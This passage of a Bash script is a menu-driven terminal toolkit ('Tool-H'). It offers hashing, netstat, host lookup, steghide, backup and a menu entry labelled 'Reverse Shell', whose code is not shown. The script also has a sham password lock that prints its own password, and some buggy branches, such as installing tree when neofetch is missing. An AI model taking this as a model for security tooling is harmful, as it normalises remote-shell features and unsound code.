  echo -e "\e[1;31m888    888                    \e[1;37m888      ";
  sleep 0.03
  echo -e "\e[1;31m888    888                    \e[1;37m888      ";
  sleep 0.03
  echo -e "\e[1;31m888    888                    \e[1;37m888      ";
  sleep 0.03
  echo -e "\e[1;31m8888888888  \e[1;37m8888b.   \e[1;31m.d8888b  \e[1;37m888888b.  ";
  sleep 0.03
  echo -e "\e[1;31m888    888     \e[1;37m'88b \e[1;31m88K      \e[1;37m 888 °88b ";
  sleep 0.03
  echo -e "\e[1;31m888    888 \e[1;37m.d888888 \e[1;31m°Y8888b. \e[1;37m 888  888 ";
  sleep 0.03
  echo -e "\e[1;31m888    888 \e[1;37m888  888      \e[1;31mX88 \e[1;37m 888  888 ";
  sleep 0.03
  echo -e "\e[1;31m888    888 \e[1;37m°Y888888  \e[1;31m88888P' \e[1;37m 888  888 ";
  sleep 0.03
  echo''
  echo''
}
#######--L.I.S.T-H.A.S.H--##########-MRX
list_hash(){
  echo -e "\e[1;31m┌─────────────────────┐      ┌─────────────────────┐";
  echo -e "\e[1;31m│                     │      │                     │";
  echo -e "\e[1;31m│(\e[1;37m1\e[1;31m) \e[1;37mM\e[1;31m.\e[1;37mD\e[1;31m.\e[1;37m5\e[1;31m-\e[1;37mS\e[1;31m.\e[1;37mU\e[1;31m.\e[1;37mM      \e[1;31m│      │(\e[1;37m2\e[1;31m) \e[1;37mC\e[1;31m.\e[1;37mK\e[1;31m-\e[1;37mS\e[1;31m.\e[1;37mU\e[1;31m.\e[1;37mM        \e[1;31m│";
  echo -e "\e[1;31m│                     │      │                     │";
  echo -e "\e[1;31m└─────────────────────┘      └─────────────────────┘";
  sleep 0.03
  echo -e "┌─────────────────────┐      ┌─────────────────────┐";
  echo -e "│                     │      │                     │";
  echo -e "│(\e[1;37m3\e[1;31m) \e[1;37mB\e[1;31m.\e[1;37m2\e[1;31m-\e[1;37mS\e[1;31m.\e[1;37mU\e[1;31m.\e[1;37mM        \e[1;31m│      │(\e[1;37m4\e[1;31m) \e[1;37mB\e[1;31m.\e[1;37mA\e[1;31m.\e[1;37mS\e[1;31m.\e[1;37mE\e[1;31m.\e[1;37m3\e[1;31m.\e[1;37m2      \e[1;31m│";
  echo -e "│                     │      │                     │";
  echo -e "└─────────────────────┘      └─────────────────────┘";
  sleep 0.03
  echo -e "┌─────────────────────┐      ┌─────────────────────┐";
  echo -e "│                     │      │                     │";
  echo -e "│(\e[1;37m5\e[1;31m) \e[1;37mB\e[1;31m.\e[1;37mA\e[1;31m.\e[1;37mS\e[1;31m.\e[1;37mE\e[1;31m.\e[1;37m6\e[1;31m.\e[1;37m4      \e[1;31m│      │(\e[1;37m6\e[1;31m) \e[1;37mS\e[1;31m.\e[1;37mH\e[1;31m.\e[1;37mA\e[1;31m.\e[1;37m1\e[1;31m-\e[1;37mS\e[1;31m.\e[1;37mU\e[1;31m.\e[1;37mM    \e[1;31m│";
  echo -e "│                     │      │                     │";
  echo -e "└─────────────────────┘      └─────────────────────┘";
  sleep 0.03
  echo -e "┌─────────────────────┐      ┌─────────────────────┐";
  echo -e "│                     │      │                     │";
  echo -e "│(\e[1;37m7\e[1;31m) \e[1;37mS\e[1;31m.\e[1;37mH\e[1;31m.\e[1;37mA\e[1;31m.\e[1;37m224\e[1;31m-\e[1;37mS\e[1;31m.\e[1;37mU\e[1;31m.\e[1;37mM  \e[1;31m│      │(\e[1;37m8\e[1;31m) \e[1;37mS\e[1;31m.\e[1;37mH\e[1;31m.\e[1;37mA\e[1;31m.\e[1;37m256\e[1;31m-\e[1;37mS\e[1;31m.\e[1;37mU\e[1;31m.\e[1;37mM  \e[1;31m│";
  echo -e "│                     │      │                     │";
  echo -e "└─────────────────────┘      └─────────────────────┘";
  sleep 0.03
  echo -e "┌─────────────────────┐      ┌─────────────────────┐";
  echo -e "│                     │      │                     │";
  echo -e "│(\e[1;37m9\e[1;31m) \e[1;37mS\e[1;31m.\e[1;37mH\e[1;31m.\e[1;37mA\e[1;31m.\e[1;37m384\e[1;31m-\e[1;37mS\e[1;31m.\e[1;37mU\e[1;31m.\e[1;37mM  \e[1;31m│      │(\e[1;37m10\e[1;31m) \e[1;37mS\e[1;31m.\e[1;37mH\e[1;31m.\e[1;37mA\e[1;31m.\e[1;37m512\e[1;31m-\e[1;37mS\e[1;31m.\e[1;37mU\e[1;31m.\e[1;37mM \e[1;31m│";
  echo -e "│                     │      │                     │";
  echo -e "└─────────────────────┘      └─────────────────────┘";
  sleep 0.03
  echo ''
  echo -e $white"";
  read -p 'Choose a Hash Type { 99 to go back } >>>  ' hash ;
  if [ "${hash:-}" = '99' ] ;
  then
     clear
     letter
     logo
     list
     conditions
  elif [ "${hash:-}" = '' ] ;
  then
     echo''
     echo -e $red'Choose a Number From The List';
     echo ''
     sleep 0.6
     echo -e ' \e[1;37mLoading\e[1;32m.....';
     sleep 2.6
     logo_hash
     list_hash
  elif [ "${hash:-}" = '1' ] ;
  then
     echo''
     echo -e $green'';
     read -p 'File Path ::>>  ' path;
     if [ "${path:-}" = '' ] ;
     then
        echo ''
        echo ''
        echo -e '\e[1;37mPlease enter a \e[1;31mfile path';
        echo ''
        echo -e ' \e[1;37mLoading\e[1;32m.....';
        sleep 2.6
        logo_hash
        list_hash
     else
        echo''
        echo''
        md5=`md5sum $path`
        echo -e '\e[1;32mMD5-SUM \e[1;34m::\e[1;31m '$md5 ;
     fi
  elif [ "${hash:-}" = '2' ] ;
  then
     echo''
     echo -e $green'';
     read -p 'File Path ::>>  ' path1;
     if [ "${path1:-}" = '' ] ;
     then
        echo ''
        echo ''
        echo -e '\e[1;37mPlease enter a \e[1;31mfile path';
        echo ''
        echo -e ' \e[1;37mLoading\e[1;32m.....';
        sleep 2.6
        logo_hash
        list_hash
     else
        echo''
        echo''
        cksum=`cksum $path1`
        echo -e '\e[1;32mCK-SUM \e[1;34m::\e[1;31m '$cksum ;
     fi
  elif [ "${hash:-}" = '3' ] ;
  then
     echo''
     echo -e $green'';
     read -p 'File Path ::>>  ' path2;
     if [ "${path2:-}" = '' ] ;
     then
        echo ''
        echo ''
        echo -e '\e[1;37mPlease enter a \e[1;31mfile path';
        echo ''
        echo -e ' \e[1;37mLoading\e[1;32m.....';
        sleep 2.6
        logo_hash
        list_hash
     else
        echo''
        echo''
        b2sum=`b2sum $path2`
        echo -e '\e[1;32mB.2-SUM \e[1;34m::\e[1;31m '$b2sum ;
     fi
  elif [ "${hash:-}" = '4' ] ;
  then
     echo''
     echo -e $green'';
     read -p 'File Path ::>>  ' path3;
     if [ "${path3:-}" = '' ] ;
     then
        echo ''
        echo ''
        echo -e '\e[1;37mPlease enter a \e[1;31mfile path';
        echo ''
        echo -e ' \e[1;37mLoading\e[1;32m.....';
        sleep 2.6
        logo_hash
        list_hash
     else
        echo''
        echo''
        base32=`base32 $path3`
        echo -e '\e[1;32mB.A.S.E.32-Hash \e[1;34m::\e[1;31m '$base32 ;
     fi
  elif [ "${hash:-}" = '5' ] ;
  then
     echo''
     echo -e $green'';
     read -p 'File Path ::>>  ' path4;
     if [ "${path4:-}" = '' ] ;
     then
        echo ''
        echo ''
        echo -e '\e[1;37mPlease enter a \e[1;31mfile path';
        echo ''
        echo -e ' \e[1;37mLoading\e[1;32m.....';
        sleep 2.6
        logo_hash
        list_hash
     else
        echo''
        echo''
        base64=`base64 $path4`
        echo -e '\e[1;32mB.A.S.E.64-Hash \e[1;34m::\e[1;31m '$base64 ;
     fi
  elif [ "${hash:-}" = '6' ] ;
  then
     echo''
     echo -e $green'';
     read -p 'File Path ::>>  ' path5;
     if [ "${path5:-}" = '' ] ;
     then
        echo ''
        echo ''
        echo -e '\e[1;37mPlease enter a \e[1;31mfile path';
        echo ''
        echo -e ' \e[1;37mLoading\e[1;32m.....';
        sleep 2.6
        logo_hash
        list_hash
     else
        echo''
        echo''
        sha1sum=`sha1sum $path5`
        echo -e '\e[1;32mS.H.A.1-S.U.M \e[1;34m::\e[1;31m '$sha1sum ;
     fi
  elif [ "${hash:-}" = '7' ] ;
  then
     echo''
     echo -e $green'';
     read -p 'File Path ::>>  ' path6;
     if [ "${path6:-}" = '' ] ;
     then
        echo ''
        echo ''
        echo -e '\e[1;37mPlease enter a \e[1;31mfile path';
        echo ''
        echo -e ' \e[1;37mLoading\e[1;32m.....';
        sleep 2.6
        logo_hash
        list_hash
     else
        echo''
        echo''
        sha224sum=`sha224sum $path6`
        echo -e '\e[1;32mS.H.A.224-S.U.M \e[1;34m::\e[1;31m '$sha224sum ;
     fi
  elif [ "${hash:-}" = '8' ] ;
  then
     echo''
     echo -e $green'';
     read -p 'File Path ::>>  ' path7;
     if [ "${path7:-}" = '' ] ;
     then
        echo ''
        echo ''
        echo -e '\e[1;37mPlease enter a \e[1;31mfile path';
        echo ''
        echo -e ' \e[1;37mLoading\e[1;32m.....';
        sleep 2.6
        logo_hash
        list_hash
     else
        echo''
        echo''
        sha256sum=`sha256sum $path7`
        echo -e '\e[1;32mS.H.A.256-S.U.M \e[1;34m::\e[1;31m '$sha256sum ;
     fi
  elif [ "${hash:-}" = '9' ] ;
  then
     echo''
     echo -e $green'';
     read -p 'File Path ::>>  ' path8;
     if [ "${path8:-}" = '' ] ;
     then
        echo ''
        echo ''
        echo -e '\e[1;37mPlease enter a \e[1;31mfile path';
        echo ''
        echo -e ' \e[1;37mLoading\e[1;32m.....';
        sleep 2.6
        logo_hash
        list_hash
     else
        echo''
        echo''
        sha384sum=`sha384sum $path8`
        echo -e '\e[1;32mS.H.A.384-S.U.M \e[1;34m::\e[1;31m '$sha384sum ;
     fi
  elif [ "${hash:-}" = '10' ] ;
  then
     echo''
     echo -e $green'';
     read -p 'File Path ::>>  ' path9;
     if [ "${path9:-}" = '' ] ;
     then
        echo ''
        echo ''
        echo -e '\e[1;37mPlease enter a \e[1;31mfile path';
        echo ''
        echo -e ' \e[1;37mLoading\e[1;32m.....';
        sleep 2.6
        logo_hash
        list_hash
     else
        echo''
        echo''
        sha512sum=`sha512sum $path9`
        echo -e '\e[1;32mS.H.A.512-S.U.M \e[1;34m::\e[1;31m '$sha512sum ;
     fi
  else
     echo''
     echo -e $red'Choose a Number From The List';
     echo ''
     sleep 0.6
     echo -e ' \e[1;37mLoading\e[1;32m.....';
     sleep 2.6
     logo_hash
     list_hash
  fi
}
#######--L.E.T.T.E.R--#########-MRX
letter(){
  printf '\e[1;37m'
  printf ' W'
  sleep 0.01
  printf 'e'
  sleep 0.01
  printf 'l'
  sleep 0.01
  printf 'c'
  sleep 0.01
  printf 'o'
  sleep 0.01
  printf 'm'
  sleep 0.01
  printf 'e'
  sleep 0.4
  printf ' T'
  sleep 0.01
  printf 'o'
  sleep 0.4
  printf ' T'
  sleep 0.01
  printf 'o'
  sleep 0.01
  printf 'o'
  sleep 0.01
  printf 'L'
  sleep 0.01
  printf '-'
  sleep 0.01
  printf 'H'
  sleep 0.01
  echo ''
}
######--OLD-L.O.G.O--######-MRX
OLD-logo(){
    echo -e $red'';
    sleep 0.03
    echo -e "  __   __  _______  _______  _______  _______  ______   ";
    sleep 0.03
    echo -e " |  | |  ||       ||       ||       ||       ||    _ |  ";
    sleep 0.03
    echo -e " |  |_|  ||   _   ||  _____||_     _||    ___||   | ||  ";
    sleep 0.03
    echo -e " |       ||  | |  || |_____   |   |  |   |___ |   |_||_ ";
    sleep 0.03
    echo -e " |   _   ||  |_|  ||_____  |  |   |  |    ___||    __  |";
    sleep 0.03
    echo -e " |  | |  ||       | _____| |  |   |  |   |___ |   |  | |";
    sleep 0.03
    echo -e " |__| |__||_______||_______|  |___|  |_______||___|  |_|";
    sleep 0.03
    echo''
}
######--NEW-LOGO--#########-MRX
logo(){
  echo -e "";
  echo -e " \e[1;31m_______          _             \e[1;37m _     _ ";
  sleep 0.03
  echo -e "\e[1;31m(_______)        | |            \e[1;37m(_)   (_)";
  sleep 0.03
  echo -e "   \e[1;31m _  ___   ___ | |   \e[1;37m _____   \e[1;31m _______ ";
  sleep 0.03
  echo -e "   \e[1;31m| |/ _ \ / _ \| |   \e[1;37m(_____)  \e[1;31m|  ___  |";
  sleep 0.03
  echo -e "   | | |_| | |_| | |            | |   | |";
  sleep 0.03
  echo -e "   |_|\___/ \___/ \_)           |_|   |_|";
  echo -e "";
}
######--B.A.N.N.E.R--########-MRX
banner(){
    echo''
    echo -e '\e[1;34m[*] OK ';
    sleep 1.5
    echo''
    echo -e $white'××××××××××××××××××××××××';
    sleep 0.1
    echo -e $red'   Getting More Info';
    sleep 0.1
    echo -e $white'××××××××××××××××××××××××';
    sleep 0.1
    echo ''
    sleep 1.4
}
######--D.N.S--#########-MRX
DNS(){
    echo -e $green''
    nslookup $userinput1
    echo ''
    echo -e "Done...";
    echo''
}
######--H.O.S.T.I.N.G--########-MRX
hosting(){
  echo''
  echo -e "\e[1;37m[\e[1;31m*\e[1;37m] Don't Use \e[1;37m{\e[1;31mhttp \e[1;37m, \e[1;31mhttps\e[1;37m}";
  echo -e $blue''
  read -p "[*] Enter The website { To Go Back Type '99' } :: " userinput1;
  if [ "${userinput1:-}" = '' ] ;
  then
       echo ''
       echo -e '\e[1;37m()---> \e[1;31mCome on man enter a \e[1;37mwebsite ';
       echo ''
       echo -e ' \e[1;37m[\e[1;31m*\e[1;37m]\e[1;32m Loading .....';
       sleep 3
       clear
       echo ''
       logo
       hosting
  elif [ "${userinput1:-}" = '99' ] ;
  then
       echo ''
       echo -e $red'O.K';
       clear
       echo ''
       logo
       list
       conditions
  else
       echo''
       result=`host $userinput1 | grep  "has address"  | cut -d ' ' -f 4`
       echo -e "\e[1;32mIP \e[1;34m::\e[1;31m "$result ;
       echo -e '\e[1;35m'
       read -p "[*] More Info..? [Y/N] [*] :: " input;
       if [[ $input == 'Y' || $input == 'y' || $input == 'yes' ]] ;
       then
            banner
            DNS
       elif [[ $input == 'N' || $input == 'n' || $input == 'no' ]] ;
       then
            echo ''
            echo -e $yellow"As You want...See you soon..bye";
            echo''
       else
            echo''
            echo -e $yellow"Goodbye";
            echo''
       fi
  fi

}
##################--Conditions--################
conditions(){
  echo -e '\e[1;37m';
  read -p 'Choose a Number ::>  ' num;
  if [ "${num:-}" = "10" ] ;
  then
     hosting
  elif [ "${num:-}" = '' ] ;
  then
     echo''
     echo -e $red'Choose a Number From The List';
     echo ''
     sleep 0.6
     echo -e ' \e[1;37mLoading\e[1;32m.....';
     sleep 2.6
     clear
     letter
     logo
     list
     conditions
  elif  [ "${num:-}" = "1" ] ;
  then
     echo -e "\e[1;33m-------\e[1;34m[\e[1;37mActive\e[1;32m_\e[1;37mConnections\e[1;32m_\e[1;32mStart\e[1;34m]\e[1;33m-------\e[1;37m";
     sleep 0.5
     echo ''
     netstat
     echo ''
     sleep 0.5
     echo -e "\e[1;33m--------\e[1;34m[\e[1;37mActive\e[1;31m_\e[1;37mConnections\e[1;31m_\e[1;31mEnd\e[1;34m]\e[1;33m---------";
     echo -e $red '';
     read -p 'Back [B] or Exit [E]....?  ' con;
     if [ "${con:-}" = "B" ] ;
     then
          clear
          letter
          logo
          list
          conditions
     elif [ "${con:-}" = "E" ] ;
     then
          clear
          echo -e $red'Goodbye';
          echo''
     fi
  elif [ "${num:-}" = "3" ] ;
  then
     if [ -e /$PREFIX/bin/neofetch ] ;
     then
        sleep 2
        echo ''
        echo''
        neofetch
        echo -e $red'';
        read -p 'Back [B] or Exit [E]....?  ' con1;
        if [ "${con1:-}" = "B" ] ;
        then
             clear
             letter
             logo
             list
             conditions
        elif [ "${con1:-}" = "E" ] ;
        then
             clear
             echo -e $red'Goodbye';
             echo''
        fi
     else
        echo ''
        sleep 0.3
        echo -e '\e[1;37mPackage " \e[1;31mneofetch \e[1;37m" \e[1;37mis \e[1;31mrequired';
        echo ''
        sleep 0.5
        echo -e '\e[1;37mInstalling Neofetch \e[1;32m.....\e[1;37m';
        apt install tree --silent -y
        echo ''
        echo 'Installed'
     fi
  elif [ "${num:-}" = "4" ] ;
  then
     logo_hash
     list_hash
  elif [ "${num:-}" = "5" ] ;
  then
     echo''
     if [[ -e /$PREFIX/bin/tree ]] ;
     then
        echo -e $yellow'';
        read -p 'Enter the Path : ' p;
        if [[ $p == "" ]] ;
        then
           echo ''
           echo ''
           echo -e '\e[1;37mPlease enter a \e[1;31mpath';
           echo ''
           echo -e ' \e[1;37mLoading\e[1;32m.....';
           sleep 2.6
           clear
           letter
           logo
           list
           conditions
        else
           echo ''
           echo -e '\e[1;37m------------\e[1;32m[ \e[1;32mSTART \e[1;37mTree \e[1;32m]\e[1;37m--------------';
           echo ''
           tree $p
           echo ''
           echo -e '\e[1;37m------------\e[1;31m[ \e[1;31mEND \e[1;37mTree \e[1;31m]\e[1;37m--------------';
        fi
     else
        echo ''
        echo -e '\e[1;37mPackage " \e[1;31mtree \e[1;37m" \e[1;37mis \e[1;31mrequired';
        echo ''
        echo -e '\e[1;37mInstalling Tree \e[1;32m.....\e[1;37m';
        apt install tree --silent -y
        echo ''
        echo 'Installed'
     fi
  elif [ "${num:-}" = "6" ] ;
  then
     echo''
     if [[ -e /$PREFIX/bin/steghide ]] ;
     then
        clear
        logo_steg
        list_steg
     else
        echo -e '\e[1;33m'
        echo -e ' I require Steghide to work ';
        echo ''
        echo -e ' Installing Steghide';
        apt-get install steghide --silent -y
     fi
  elif [[ $num == '7' ]] ;
  then
     br_logo
     br_list
  elif [[ $num == '9' ]] ;
  then
     RS-logo
     RS-list
  elif [[ $num == '2' ]] ;
  then
     chat-logo
     chat-run
  elif [ "${num:-}" = "8" ] ;
  then
     bash /${HOME}/Tool-H/game/minesweeper.sh
  else
     echo''
     echo -e $red'Choose a Number From The List';
     echo ''
     sleep 0.6
     echo -e ' \e[1;37mLoading\e[1;32m.....';
     sleep 2.6
     clear
     letter
     logo
     list
     conditions
  fi
}

#################--Conditions--################
list(){
  echo -e " \e[1;31m┌─────────────────────┐    ┌─────────────────────┐";
  echo -e " │                     │    │                     │";
  echo -e " │(\e[1;37m1\e[1;31m)\e[1;37mActive Connections\e[1;31m│    │(\e[1;37m2\e[1;31m)  \e[1;37mC.H.A.T         \e[1;31m│";
  echo -e " │                     │    │                     │";
  echo -e " └─────────────────────┘    └─────────────────────┘";
  sleep 0.09
  echo -e " ┌─────────────────────┐    ┌─────────────────────┐";
  echo -e " │                     │    │                     │";
  echo -e " │(\e[1;37m3\e[1;31m) \e[1;37mDevice Info      \e[1;31m│    │(\e[1;37m4\e[1;31m)  \e[1;37mH.A.S.H         \e[1;31m│";
  echo -e " │                     │    │                     │";
  echo -e " └─────────────────────┘    └─────────────────────┘";
  sleep 0.09
  echo -e " ┌─────────────────────┐    ┌─────────────────────┐";
  echo -e " │                     │    │                     │";
  echo -e " │\e[1;31m(\e[1;37m5\e[1;31m) \e[1;37mFiles Tree       \e[1;31m│    │(\e[1;37m6\e[1;31m)\e[1;37m S.T.E.G.H.I.D.E  \e[1;31m│";
  echo -e " │                     │    │                     │";
  echo -e " └─────────────────────┘    └─────────────────────┘";
  sleep 0.09
  echo -e " ┌─────────────────────┐    ┌─────────────────────┐";
  echo -e " │                     │    │                     │";
  echo -e " │(\e[1;37m7\e[1;31m) \e[1;37mBACKUP \e[1;31m& \e[1;37mRESTORE \e[1;31m│    │(\e[1;37m8\e[1;31m)  \e[1;37mMineSweeper     \e[1;31m│";
  echo -e " │                     │    │                     │";
  echo -e " └─────────────────────┘    └─────────────────────┘";
  sleep 0.09
  echo -e " ┌─────────────────────┐    ┌─────────────────────┐";
  echo -e " │                     │    │                     │";
  echo -e " │(\e[1;37m9\e[1;31m) \e[1;37mReverse Shell    \e[1;31m│    │(\e[1;37m10\e[1;31m)  \e[1;37mH.O.S.T        \e[1;31m│";
  echo -e " │                     │    │                     │";
  echo -e " └─────────────────────┘    └─────────────────────┘";
  sleep 0.09
}
about(){
    sleep 1.3
    echo -e "  \e[1;37m┌──────────────────────────────────────────────────────┐";
    sleep 0.01
    echo -e "  │\e[1;31mCreator\e[1;37m:\e[1;32mMasterX\e[1;37m(\e[1;31mSeif Sherif\e[1;37m)                          │";
    sleep 0.01
    echo -e "  │                                                      │";
    sleep 0.01
    echo -e "  │\e[1;31mGithub\e[1;37m:\e[1;32mMasterX_Code                                   \e[1;37m│";
    sleep 0.01
    echo -e "  │                                                      │";
    sleep 0.01
    echo -e "  │\e[1;31mTelegram\e[1;37m:\e[1;32m@MasterXSeif                                 \e[1;37m│";
    sleep 0.01
    echo -e "  │                                                      │";
    sleep 0.01
    echo -e "  │\e[1;31mEmail\e[1;37m: \e[1;32mseifsherifssv@gmail.com                        \e[1;37m│";
    sleep 0.01
    echo -e "  │                                                      │";
    sleep 0.01
    echo -e "  │\e[1;31mCoder \e[1;37m& \e[1;32mEthical Hacker                                \e[1;37m│";
    sleep 0.01
    echo -e "  │                                                      │";
    sleep 0.01
    echo -e "  │\e[1;31mCountry\e[1;37m:\e[1;32mEgypt                                         \e[1;37m│";
    sleep 0.01
    echo -e "  │                                                      │";
    sleep 0.01
    echo -e "  │\e[1;31mYouTube\e[1;37m: \e[1;32myoutube.com/channel/UCky53nmT6DhP3Uyrz0rKyHw \e[1;37m│";
    sleep 0.01
    echo -e "  \e[1;37m└──────────────────────────────────────────────────────┘";
    sleep 0.01
}
#######################-MRX-Progress-Loading--###############
function delay()
{
    sleep 0.3;
}
CURRENT_PROGRESS=0
function progress()
{
    PARAM_PROGRESS=$1;
    PARAM_PHASE=$2;

    if [ $CURRENT_PROGRESS -le 0 -a $PARAM_PROGRESS -ge 0 ]  ; then echo -ne "\e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[                                       ] (0%)  $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 5 -a $PARAM_PROGRESS -ge 5 ]  ; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[████                                   ] (5%)  $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 10 -a $PARAM_PROGRESS -ge 10 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[████████                               ] (10%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 15 -a $PARAM_PROGRESS -ge 15 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[████████████                           ] (15%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 20 -a $PARAM_PROGRESS -ge 20 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[██████████████                         ] (20%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 25 -a $PARAM_PROGRESS -ge 25 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[███████████████                        ] (25%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 30 -a $PARAM_PROGRESS -ge 30 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[████████████████                       ] (30%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 35 -a $PARAM_PROGRESS -ge 35 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[█████████████████                      ] (35%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 40 -a $PARAM_PROGRESS -ge 40 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[██████████████████                     ] (40%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 45 -a $PARAM_PROGRESS -ge 45 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[███████████████████                    ] (45%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 50 -a $PARAM_PROGRESS -ge 50 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[████████████████████                   ] (50%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 55 -a $PARAM_PROGRESS -ge 55 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[████████████████████████               ] (55%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 60 -a $PARAM_PROGRESS -ge 60 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[██████████████████████████             ] (60%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 65 -a $PARAM_PROGRESS -ge 65 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[████████████████████████████           ] (65%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 70 -a $PARAM_PROGRESS -ge 70 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[██████████████████████████████         ] (70%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 75 -a $PARAM_PROGRESS -ge 75 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[████████████████████████████████       ] (75%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 80 -a $PARAM_PROGRESS -ge 80 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[█████████████████████████████████      ] (80%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 85 -a $PARAM_PROGRESS -ge 85 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[███████████████████████████████████    ] (85%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 90 -a $PARAM_PROGRESS -ge 90 ]; then echo -ne " \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m[███████████████████████████████████████] (100%) $PARAM_PHASE \r" ; delay; fi;
    if [ $CURRENT_PROGRESS -le 100 -a $PARAM_PROGRESS -ge 100 ];then echo -ne ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;37m Done \e[1;32m√                                           \n' ; delay; fi;

    CURRENT_PROGRESS=$PARAM_PROGRESS;

}
########################-MRX
Locked(){
  clear
  echo''
  echo -e " \e[1;37m{\e[1;31mLocked\e[1;37m} ";
  echo -e "            .-^^-.     ";
  echo -e "           / .--. \    ";
  echo -e "          / /    \ \   ";
  echo -e "          | |    | |   ";
  echo -e "          | |.-^^-.|   ";
  echo -e "         /// .::::. \  ";
  echo -e "        ||| ::\e[1;31m/  \.\e[1;37m: ; ";
  echo -e "        ||; ::\e[1;31m\__/\e[1;37m:: ; ";
  echo -e "         ||\ °::::° /  ";
  echo -e "          °=°:-..-°°   ";
  echo''
  echo -e "\e[1;32m┌─────────────────────┐";
  echo -e "│ \e[1;37mPassword \e[1;31m: \e[1;37mMasterX  \e[1;32m│";
  echo -e "└─────────────────────┘";
  echo -e $red'';
  printf "[*] Enter The Password >>> ";
  read -s lock;
  if [[ $lock == "MasterX" || $lock ==  '.'  ]] ;
  then
     Opened
  else
      echo''
      echo -e $purple'()---> Wrong Pass';
      sleep 1.4
      Locked
  fi
}
#########################-MRX
Opened(){
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
#  echo -e ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading Please Wait....';
  echo -e "";
  progress 10 Initializing
  progress 20 "Loading Colors...     "
  progress 40 "Configuring Reverse Shell...     "
  progress 60 "Processing...                   "
  progress 80 "Setting Up Hashes...            "
  progress 90 "Processing...                 "
  progress 100 "                                       "
  sleep 2
# Spin
  clear
  letter
  logo
  about
  list
  conditions
}
#########################-MRX
Spin(){
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '/';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '-';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
